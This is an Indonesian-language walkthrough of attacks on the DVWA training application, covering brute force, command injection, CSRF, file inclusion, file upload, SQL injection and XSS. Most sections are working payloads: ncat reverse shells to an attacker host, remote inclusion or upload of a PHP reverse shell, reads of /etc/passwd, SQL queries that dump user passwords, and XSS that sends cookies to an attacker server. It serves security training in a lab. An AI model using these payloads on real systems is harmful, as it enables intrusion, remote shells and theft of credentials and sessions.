# DVWA Tricks
Damn Vulnerable Web Application (DVWA) adalah aplikasi web berbasis PHP/MySQL yang sangat rentan. Tujuan utamanya adalah untuk menjadi bantuan bagi para profesional keamanan untuk menguji skill dan tools di lingkungan yang legal, membantu developer web lebih memahami proses mengamankan aplikasi web dan membantu siswa & guru untuk belajar tentang keamanan aplikasi web di platform yang sudah disediakan.

Informasi Download dan instalasi: https://github.com/digininja/DVWA

## Brute Force
Serangan brute-force terjadi saat penyerang menggunakan sistem coba-coba (trial and error) untuk menebak kredensial pengguna yang valid. Penyerang dapat mengotomatisasi proses penyerangan brute force dengan tool khusus sehingga penyerang dapat melakukan upaya login dalam jumlah besar dengan kecepatan tinggi.

### Security Low
- Brute force untuk menemukan password admin menggunakan tool Burp Suite. Pertama-tama bikin attack dengan tipe **Sniper** set payload hanya pada parameter password seperti pada gambar dibawah

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2026.JPG)

- Buat payload dengan tipe **Simple List** dan klik load lalu pilih wordlist `/usr/share/seclists/Passwords/darkweb2017-top100.txt` dan jalankan serangan dengan menekam tombol Start Attack

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2027.JPG)

- Setelah proses penyerangan selesai, kita bisa lakukan sorting berdasarkan length. Request yang memiliki length paling berbeda adalah hasil brute force nya

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2028.JPG)

- Brute force password admin menggunakan tool wfuzz
```sh
wfuzz --hs "incorrect" -c -w /usr/share/seclists/Passwords/darkweb2017-top100.txt -b 'PHPSESSID=hash; security=low' 'http://<IP_Server>/DVWA/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login'
``` 

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2029.JPG)

-Brute force password semua user dengan tool wfuzz
```sh
wfuzz --hs "incorrect" -c -z file,user-dvwa.txt -z file,/usr/share/seclists/Passwords/darkweb2017-top100.txt -b 'PHPSESSID=hash; security=low' 'http://<IP_Server>/DVWA/vulnerabilities/brute/index.php?username=FUZZ&password=FUZ2Z&Login=Login'
``` 

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2030.JPG)

### Security Medium
- Disini kita dapat melakukan brute force dengan cara yang sama, namun tiap request terjeda selama 2 detik sehingga proses brute force menjadi sangat lama 
```sh
wfuzz --hs "incorrect" -c -w /usr/share/seclists/Passwords/darkweb2017-top100.txt -b 'PHPSESSID=hash; security=low' 'http://<IP_Server>/DVWA/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login'
``` 

### Security High
- Disini kita akan melakukan bypass terhadap **user_token**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2031.JPG)

- Buat attack dengan type **Pitchfork** dan tempatkan payload pada parameter **password** dan **user_token**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2032.JPG)

- Buat payload 1 dengan tipe **Simple List** dan klik load lalu pilih wordlist `/usr/share/seclists/Passwords/darkweb2017-top100.txt`

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2033.JPG)

- Buat payload 2 dengan tipe **Recursive Grep**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2036.JPG)

- Clear semua string di **Grep - Match** lalu Add string **incorrect**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2037.JPG)

- Tekan tombol **Add** pada bagian **Grep Extract** lalu block hash token lalu pilih **Start at offset** dan **End at fixed length**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2038.JPG)

- Pada bagian **Redirections** pilih **Always**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2039.JPG)

- Pada tab **Resource pool** pilih **Create new resource pool** lalu centang **Maximum concurrent requests** dan isi 1. Jika sudah tekan tombol **Start Attack** untuk memulai penyerangan

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2040.JPG)

- Setelah proses penyerangan selesai, kita bisa lakukan sorting berdasarkan length. Request yang memiliki length paling berbeda adalah hasil brute force nya

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2041.JPG)

## Command Injection
Command Injection (Shell Injection) adalah celah keamanan web yang memungkinkan penyerang dapat mengeksekusi perintah sistem operasi (OS) sewenang-wenang di server yang menjalankan aplikasi, dan biasanya membahayakan aplikasi dan semua data.

### Security Low
```sh
127.0.0.1; ls
``` 
![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%201.JPG)

```sh
127.0.0.1; whoami; hostname
```
![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%202.JPG)

Menjalankan Reverse Shell di Server
```sh
127.0.0.1; ncat <IP_Attacker> 9999 -e /bin/bash
```

Listener
```sh
nc -lnvp 9999
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%208.JPG)


### Security Medium
```sh
127.0.0.1& ls
```
```sh
127.0.0.1& whoami& hostname
```
```sh
127.0.0.1& ncat <IP_Attacker> 9999 -e /bin/bash
```

### Security High
Di level ini kita hanya bisa mengeksekusi 1 perintah saja
```sh
127.0.0.1|ls
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%203.JPG)

## CSRF
Cross-site request forgery atau Pemalsuan permintaan lintas situs adalah celah keamanan web yang memungkinkan penyerang membujuk pengguna untuk melakukan tindakan yang tidak ingin mereka lakukan.

### Security Low
Mengganti password pengguna menjadi **test** lewat link
```sh
http://<IP_Server>/DVWA/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change
```

Mengganti password pengguna menjadi **test123** lewat halaman palsu (phising). Silahkan Edit dan simpan kode dibawah ini dengan **nama_file.html**
```sh
<html>
    <body>
        <form action="http://<IP_Server>/DVWA/vulnerabilities/csrf" method="GET">
            <input type="hidden" name="password_new" value="test123" />
            <input type="hidden" name="password_conf" value="test123" />
            <input type="hidden" name="Change" value="Change" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%204.JPG)

## File Inclusion
File Inclusion Attack adalah jenis celah keamanan web yang memungkinkan penyerang mengakses file sensitif di server atau memungkinkan mereka untuk menjalankan file berbahaya di server mereka.

### Security Low
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file4.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%205.JPG)

```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%206.JPG)

Membuka isi file **/etc/passwd** di server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%207.JPG)

Menjalankan file **php-reverse-shell.php** ke server
```sh
python3 -m http.server 80
```
```sh
nc -lnvp <port>
```
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=http://<IP_Attacker>/php-reverse-shell.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2034.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2035.JPG)

### Security Medium
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=....//....//hackable/flags/fi.php
```

Membuka isi file **/etc/passwd** di server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=....//....//....//....//....//....//etc/passwd
```

Menjalankan file **php-reverse-shell.php** ke server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=hthttp://tp://<IP_Attacker>/php-reverse-shell.php
```

### Security High
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/hackable/flags/fi.php
```

Membuka isi file **/etc/passwd** di server
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
```

## File Upload
File upload vulnerabilities terjadi ketika server web mengizinkan pengguna untuk mengunggah file ke sistem tanpa memvalidasi hal-hal penting seperti nama, type, konten, atau ukurannya.

- Sebelumnya melakukan uji serangan, download terlebih dahulu file PHP reverse shell di https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php kemudian ubah IP menjadi IP Komputer yang anda gunakan dan port sesuai kebutuhan

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2023.JPG)

- Buat sebuah listener untuk terhubung ke reverse shell dan pastikan port yang digunakan sama dengan port di file php reverse shell diatas
```sh
nc -lnvp <port>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2024.JPG)

### Security Low
- Upload file **php-reverse-shell.php** ke halaman web

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2021.JPG)

- Untuk menjalankan file **php-reverse-shell.php** di server, cukup buka url tempat file tersimpan di tab baru pada browser maka netcat berhasil terhubung
```sh
http://<IP_Server>/DVWA/hackable/uploads/php-reverse-shell.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2022.JPG)

### Security Medium
- Gunakan tool Burp Suite untuk mengubah **Content-Type: application/x-php** menjadi **Content-Type: image/jpeg**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2025.JPG)

- Jalankan file **php-reverse-shell.php** seperti pada langkah sebelumnya


## SQL Injection
SQL Injection (SQLi) adalah celah keamanan web yang memungkinkan penyerang mengintruksi query yang dibuat aplikasi untuk melihat data yang biasanya tidak dapat mereka ambil, misalnya data pengguna lain atau data lain apapun yang dapat diakses oleh aplikasi itu sendiri

### Security Low
Tambahkan spasi setelah **--**
```sh
a' UNION SELECT user, password FROM users -- 
```

```sh
q' UNION SELECT user, password FROM users #
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%209.JPG)

### Security Medium
Lakukan injeksi pada tag `<option>` menggunakan inspect element di browser
```sh
1 or 1=1 UNION SELECT user, password FROM users#
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2010.JPG)

### Security High
```sh
1' UNION SELECT user, password FROM users#
```

## SQL Injection (Blind)
Blind SQL Injection muncul ketika aplikasi rentan terhadap SQL Injection, tetapi respons HTTP-nya tidak berisi hasil kueri SQL yang relevan atau detail kesalahan basis data apa pun.

### Security Low
```sh
1' and length(database())=4#
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2011.JPG)

### Security Medium
Lakukan injeksi pada tag `<option>` menggunakan inspect element di browser
```sh
1 and sleep(5)
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2012.JPG)

## Weak Session IDS
ID sesi yang lemah dapat memungkinkan pengguna lain dibajak sesinya. Jika ID sesi diambil dari rentang nilai yang kecil, penyerang hanya perlu menyelidiki ID sesi yang dipilih secara acak hingga menemukan kecocokan.

## XSS (DOM)
DOM based XSS muncul ketika Javascript mengambil data dari sumber yang dapat dikontrol oleh penyerang misalnya seperti URL, yang memungkinkan penyerang mengeksekusi code JavaScript yang berbahaya dan membajak akun pengguna lain.

### Security Low
Menampilkan cookie halaman
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>alert(document.cookie);</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2013.JPG)

Membuat halaman untuk menampung cookie
```sh
python3 -m http.server 80
```

Melakukan pencurian cookie dan kirim ke halaman penampung
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=<script>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2014.JPG)

### Security Medium
Menampilkan cookie halaman
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=English</select><img src/onerror=alert(document.cookie)>
```

Melakukan pencurian cookie dan kirim ke halaman penampung
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/?default=English</select><img src/onerror=window.location='http://<IP_Attacker>/?cookie='+document.cookie>
```

### Security High
Menampilkan cookie halaman
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/#?default=<script>alert(document.cookie);</script>
```

Melakukan pencurian cookie dan kirim ke halaman penampung
```sh
http://<IP_Server>/DVWA/vulnerabilities/xss_d/#?default=<script>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>
```

## XSS (Reflected)
Reflected cross-site scripting (XSS) muncul saat aplikasi menerima data dalam permintaan HTTP dan menyertakan data tersebut dalam respons langsung dengan cara yang tidak aman.

### Security Low
Menampilkan cookie halaman
```sh
<input onfocus=javascript:alert(document.cookie) autofocus>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2015.JPG)

Melakukan pencurian cookie
```sh
<input onfocus=javascript:window.location='http://<IP_Attacker>/?cookie='+document.cookie autofocus>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2016.JPG)

### Security Medium
Menampilkan cookie halaman
```sh
<scr<script>ipt>alert(document.cookie);</script>
```

Melakukan pencurian cookie
```sh
<scr<script>ipt>window.location='http://<IP_Attacker>/?cookie='+document.cookie;</script>
```

### Security High
Menampilkan cookie halaman
```sh
<img src/onerror=alert(document.cookie)>
```

## XSS Stored
XSS Stored atau Persistent XSS muncul saat aplikasi menerima data dari sumber yang tidak tepercaya dan menyertakan data tersebut dalam respons HTTP selanjutnya dengan cara yang tidak aman.

### Security Low
- Sebelum melakukan uji serangan, ubah maxlength pada **textarea** dari 50 menjadi 500 karakter melalui inspect element

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2017.JPG)

- Masukkan script ini ke field **Message**
```sh
<script>window.location='http://<IP_Server>/?cookie='+document.cookie</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2018.JPG)

### Security Medium
- Sebelum melakukan uji serangan, ubah maxlength pada **input** dari 10 menjadi 100 karakter melalui inspect element

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2019.JPG)

- Masukkan script ini ke field **Name**
```sh
<scr<script>ipt>window.location='http://<IP_Attacker>/?cookie='+document.cookie</script>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2020.JPG)

### Security High
- Ubah maxlength pada **input** menjadi 100 karakter seperti pada langkah sebelumnya
- Masukkan script ini ke field **Name**
```sh
<a onclick="alert(document.cookie)" style=display:block>test</a>
```

Referensi: https://portswigger.net/web-security/learning-path